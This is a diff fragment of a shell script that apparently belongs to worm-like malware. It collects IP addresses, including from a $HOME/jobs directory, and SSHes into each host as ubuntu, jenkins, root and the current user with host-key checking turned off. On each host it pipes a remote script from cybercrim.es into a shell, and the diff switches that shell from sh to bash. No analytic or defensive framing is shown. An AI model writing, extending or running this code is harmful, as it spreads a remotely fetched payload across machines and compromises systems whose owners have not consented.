@@ -27,10 +27,10 @@ if [ "${historyc}" = true ]; then
         continue
       fi
     
-      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | sh"
+      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | bash"
     done
 
     grep -r -oE '\b([0-9]{1,3}\.){3}[0-9]{1,3}\b' "$HOME/jobs" | cut -d ':' -f 2 | sort -u | while read ip; do
@@ -38,10 +38,10 @@ if [ "${historyc}" = true ]; then
         continue
       fi
 
-      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | sh"
-      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | sh"
+      timeout 7s ssh -o StrictHostKeyChecking=no ubuntu@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no jenkins@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no root@${ip} "curl -s https://cybercrim.es/l | bash"
+      timeout 7s ssh -o StrictHostKeyChecking=no $USER@${ip} "curl -s https://cybercrim.es/l | bash"
     done  
     )
 fi
